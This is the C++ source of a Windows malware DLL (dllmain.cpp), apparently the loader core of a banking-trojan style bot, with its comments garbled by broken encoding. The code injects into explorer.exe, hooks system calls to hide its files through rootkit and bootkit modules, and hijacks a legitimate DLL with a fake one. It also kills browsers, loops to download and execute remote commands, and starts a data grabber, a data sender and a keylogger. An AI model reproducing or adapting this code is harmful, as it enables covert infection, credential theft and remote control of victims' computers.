// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include "stdafx.h"
#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Task.h"
#include "BotEvents.h"
#include "Loader.h"
#include "Config.h"
#include "BotCore.h"


#include "Crypt.h"
#include "BootkitCrypt.h"
#include "Modules.h"
#include "ntdll.h"
#include "coocksol.h"
#include "md5.h"
#include "DbgRpt.h"

#pragma comment(linker, "/ENTRY:MyDllMain" )

//------------------------------------------------------------------------------
//  ������� ���������� �����
//------------------------------------------------------------------------------
#include "BotDebug.h"

namespace DLLDBGTEMPLATES
{
#include "DbgTemplates.h"
}

#define DLLDBG DLLDBGTEMPLATES::DBGOutMessage<>


//------------------------------------------------------------------------------


//-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	-	

WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
DWORD dwWebMoneySelf = 0;

//���������� ���������� ��� �������� ������ ��� ������� ���� Fake.dll
char FakeDllPathBot[MAX_PATH]; //���� � ������������ ���� ���� (bot.plug)
char FakeDllPathDll[MAX_PATH]; //���� � ����� Fake.dll, �� �������� ������������ dll
char FakeDllPathOrigDll[MAX_PATH]; //���� � ������������ ���
char FakeDllCryptKey[32]; //���� ��� ���������� ���� ����
int FakeDllLenCryptKey = 0; //����� ����� ���������� ���� ����

//DWORD dwExplorerPid  = 0; //��� ����������

//��������� ��� ������ ����� � ������� ��������� �������, �� ����� ���� ���� ������� �����
DWORD GetHashFileNameBotPlug();

DWORD WINAPI LoaderRoutine(LPVOID Data)
{
	BOT::Initialize(ProcessLoader);

	DLLDBG("====>Bot DLL", "-------- LoaderRoutine (v10)");

	switch( BOT::GetBotType() )
	{
		case BotBootkit: //���� ���������� �� ��� �������, �� ������� ring3 ���� �� ������������
			BOT::UninstallService();
			BOT::DeleteAutorunBot();
			break;
	}

	//UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// ������������ ���������� �������� �����
	InitializeTaskManager(NULL, true);

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	// 402_pl ������ ����� ��������� ������ (�� ���������� � ������ ��������)
	DebugReportStepByName("402_pl");

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		return 0; 
	}




	// ��������� ����� �������� ������
	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;
	
	DLLDBG("====>Bot Loader", "�������� ���������� ������");
	while (true)
	{
		// 403_pl ���� ��������� ������
		DebugReportStepByName("403_pl");
		
		DownloadAndExecuteCommand(NULL, NULL);

		// "������������" �������������� ����������� ���� � ��� �������
		// �������� ��������� ���������� ������ ���� ������ ����� ���������
		// �������
		if (!FirstSended)
		{
			DLLDBG("====>Bot Loader", "���������� ���������� � �������");
			FirstSended = SendFirstInfo();
		}


		// ���������������� ���������� ������
		if (!TaskManagerSleep(NULL))
			break;
	}

	return 0;
}

DWORD WINAPI ExplorerMain(LPVOID Data)
{
	DLLDBG("====>Bot DLL", "��������� ���. ������� [%s]", GetPrefix().t_str());
	
	//UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();
	BOT::AddHiddenFile(GetHashFileNameBotPlug());

	HookZwResumeThread();
	HookZwQueryDirectoryFile();

	// 401_pl ������ BotPlug
	DebugReportStepByName("401_pl");

	DLLDBG("====>Bot DLL", "�������� Loader ()");
	MegaJump( LoaderRoutine );

	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun ) 
		{
			DLLDBG("====>Bot DLL", "�������� ������");
			MegaJump( GrabberThread );
		}
	#endif

	//MegaJump(AvFuckThread);


	// �������� ������� ������ ����������

//	if (dwFirst)
//		ExplorerFirstStart(NULL);


	ExplorerStart(NULL);


	return 0;
}

extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
{
	BOT::Initialize(ProcessUnknown);
	StartThread(ExplorerMain, NULL);
}


BOOL APIENTRY MyDllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
{
	char buf[MAX_PATH];
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			BOT::Initialize(ProcessUnknown);
			pGetModuleFileNameA( NULL, buf, MAX_PATH );
			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //�������� ���� � �������� ���������� (explorer.exe)
			{
				if( BOT::CreateBootkitMutex() )
				{
					BOT::SetBotType(BotBootkit);
					StartThread(ExplorerMain, NULL);
				}
			}
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

bool FakeDllDelete()
{
	BOT::DeleteBotFile(FakeDllPathBot);
	//���� ������������ ������������ ��� ����� ���������� (�� ������ �������), �� ��������������� ����� ������
	if( !pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING ) )
		pMoveFileExA( FakeDllPathOrigDll, FakeDllPathDll, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
	return true;
}

//������� ����������� �������� ���� � ��������� ��������
DWORD WINAPI DeleteFakeDllInSvchost(LPVOID Data)
{
	BOT::Initialize(ProcessUnknown);
	pSleep(10 * 1000); //���� ��������� �����
	DLLDBG( "DeleteFakeDllInSvchost", "Unisntall fake dll" );
	KillAllBrowsers();
	FakeDllDelete();
	return 0;
}

// �-��� ��� ������ � Explorer ��� �������� �� StartFromFakeDll
DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
{
	BOT::Initialize(ProcessUnknown);
	DLLDBG("ExplorerEntryPointFromFakeDll", "Bot started in Explorer.exe" );
	// ��� �������� ������ �������� Start, ��������������� ���
	// �������� ������� Bot.plug
	BOT::SetBotType(BotFakeDll);
	Start(NULL, NULL, NULL);
	return 0;
}

// �������������� �-��� ��� ������� Bot.plug �� FakeDll.
// pathBotPlug - ���� � ������� ��������� ���� ���
// pathFakeDll - ���� � fake.dll 
// pathOrigDll - ���� � ��� ������� ��������� �� fake.dll
// cryptKey, lenCryptKey - ���� � ����� ����� ��� ���������� ���� ���� ��� ����������
// ��� ��������� ���������� ��� �������� � ���������� ����
BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey, int lenCryptKey )
{
//	BOT::Initialize();
	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );

	m_lstrcpy( FakeDllPathBot, pathBotPlug );
	m_lstrcpy( FakeDllPathDll, pathFakeDll );
	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
	m_memcpy( FakeDllCryptKey, cryptKey, lenCryptKey );
	FakeDllLenCryptKey = lenCryptKey;
	FakeDllCryptKey[lenCryptKey] = 0;

	DLLDBG("StartFromFakeDll", "StartFromFakeDll key: '%s', len key: %d", cryptKey, lenCryptKey );

	if( BOT::BootkitIsRun() ) //���� ������� ������, �� ������� ��� ������ ����
	{
		MegaJump(DeleteFakeDllInSvchost);
	}
	else
	{
		// ������� �� �� - ������� �� ���
		HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();

		DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
		if (BotInstanceMutex )
		{
			pCloseHandle(BotInstanceMutex); //��������� ������, ����� ��� ����� ������� � �������� explorer.exe
			return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
		}
	}
	return FALSE;
}

//���������� ���� ����, ������������ ��������
bool UpdateBotBootkit( BYTE* data, int c_data )
{
	return WriteBotForBootkit( data, c_data );
}

static void XorCryptForFakeDll(LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
{
	DWORD a = 0;

	while (a < Size)
	{
		DWORD b = 0;
		while (b < KeySize)
		{
			Buffer[a] ^= (Key[b] + (a * b));
			b++;
		}
		a++;
	}
}

//���������� ���� ���� ������������ ����� fake.dll
bool UpdateBotFakeDll( BYTE* data, int c_data )
{
	TMemory mem(c_data);
	m_memcpy( mem.Buf(), data, c_data );
	XorCryptForFakeDll( (BYTE*)FakeDllCryptKey, FakeDllLenCryptKey, (BYTE*)mem.Buf(), c_data );
	if( File::WriteBufferA( FakeDllPathBot, mem.Buf(), c_data ) == c_data )
		return true;
	return false;
}

DWORD GetHashFileNameBotPlug()
{
	char* nameFile = 0;
	char buf[MAX_PATH];
	switch( BOT::GetBotType() )
	{
		case BotFakeDll:
			nameFile = FakeDllPathBot;
			break;
		case BotBootkit:
			nameFile = NameFileForBootkit( buf, sizeof(buf) );
			break;
	}
	if( nameFile )
		return File::GetNameHashA( nameFile, false );
	return 0;
}
